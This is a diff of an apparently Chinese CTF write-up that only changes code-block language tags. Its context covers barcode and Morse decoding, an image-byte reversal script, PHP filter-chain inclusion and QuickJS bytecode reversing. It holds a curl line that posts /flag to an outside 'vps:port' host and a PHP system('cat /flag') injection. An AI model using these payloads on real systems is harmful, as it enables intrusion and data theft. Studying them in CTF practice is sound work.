@@ -44,7 +44,7 @@ for i in range(2000):
 ### **bar**
 > 参考文章：https://blog.csdn.net/kzhuangood/article/details/72953354
 首先分离GIF提取出每一帧，接着我们规定黑为1，白为0，灰为空格，摩斯密码得到提示：`CODE93`
-```
+```text
 1010 111 100 0 11110 00011 
 CODE93
 ```
@@ -55,7 +55,7 @@ CODE93
 > hint：1、观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符  2、flag内容都是小写英文字母
 最后根据hint得知应该是小写的，进而得知最后两位校验码为U和M
 ![img](png-20211026015042090.png)
-```
+```text
 大写情况：
 101000100 101101100 111010010   101011110        1
     2         W      SPACE    * Start/Stop     终止条
@@ -66,7 +66,7 @@ CODE93
 整理得到flag：flag{f0c62db973684dbda896f9c5f6d962um}
 ### mirror
 010打开原图拉到尾部也发现了png头，并且发现把图片数据每16一组倒过来也是一张图片，脚本倒置一下
-```
+```python
 data = open('full.png', 'rb').read()
 data = data[::-1]
 data = [data[i:i+16][::-1] for i in range(0, len(data), 16)]
@@ -146,27 +146,27 @@ backdoor("__import__('os').system('curl -F file=@/flag http://vps:port')")
 ```
 ​    有include，所以想到的是执行代码用system来绕basedir读flag。
 前面file_put_contents会写入base64，后面的filter用base64，因为会拼接上files:
-```
+```text
 php://filter/resource=./files/file_name
 ```
 但常见的一个filter格式如下：
-```
+```text
 php://filter/read=string.toupper/resource
 ```
 遂想到将resource=./files/file_name这一段当做filter参数的一部分，因此有：
-```
+```text
 read=convert.base64-encode/resource=
 ```
 拼接为
-```
+```text
 php://filter/resource=./files/read=convert.base64-encode/resource=
 ```
 先写
-```
+```php
 c=<?php echo system('cat /flag');?>
 ```
 再包含即可：
-```
+```text
 read=convert.base64-decode/resource=/../../xxxxxx
 ```
 ###  jack-shiro
@@ -844,7 +844,7 @@ armv7 32逆向
 ## fastjs
 依照这个[https://bbs.pediy.com/thread-258985.htm](https://bbs.pediy.com/thread-258985.htm) 链接可以知道 跟之前长安杯和看雪KCTF题目差不多
 先用脚本恢复一下符号
-```
+```text
 0x02, 0x3A, 0x10, 0x6C, 0x6F, 0x6E, 0x67, 0x32, 0x73, 0x74, 
 0x72, 0x10, 0x73, 0x74, 0x72, 0x32, 0x6C, 0x6F, 0x6E, 0x67, 
 0x10, 0x73, 0x64, 0x66, 0x73, 0x66, 0x73, 0x64, 0x66, 0x0E, 
@@ -1074,7 +1074,7 @@ armv7 32逆向
 0x00, 0x00, 0x00, 0x00 
 ```
 恢复之后，根据附件字符串知道是2021.3.27版本，github上拉取一下，并且根据链接修改脚本
-```
+```c
 //#define DUMP_BYTECODE (1) 
 #define DUMP_BYTECODE (1) 
 //#define DUMP_READ_OBJECT 
@@ -1084,7 +1084,7 @@ js_dump_function_bytecode(ctx, b);
 #endif
 ```
 make过后把里面数据dump下来
-```
+```c
 #include "quickjs-libc.h" 
 #include <stdio.h> 
 #include <stdlib.h> 
